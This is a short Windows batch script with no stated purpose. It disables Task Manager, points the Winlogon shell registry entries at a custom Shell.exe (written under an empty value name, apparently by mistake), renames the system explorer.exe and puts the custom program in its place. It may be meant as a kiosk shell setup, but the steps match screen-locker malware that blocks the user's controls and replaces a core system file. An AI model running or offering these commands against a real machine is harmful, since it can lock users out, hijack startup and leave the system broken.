@echo off
REG ADD HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "" /t REG_SZ /d "C:\mas\Shell\bin\Debug\Shell.exe" /f
reg add "HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "" /t REG_SZ /d "C:\mas\Shell\bin\Debug\Shell.exe" /f
ren "%SystemRoot%\explorer.exe" "explorer-217.exe"
copy "C:\mas\Shell\bin\Debug\Shell.exe" "%SystemRoot%"
ren "%SystemRoot%\Shell.exe" explorer.exe
exit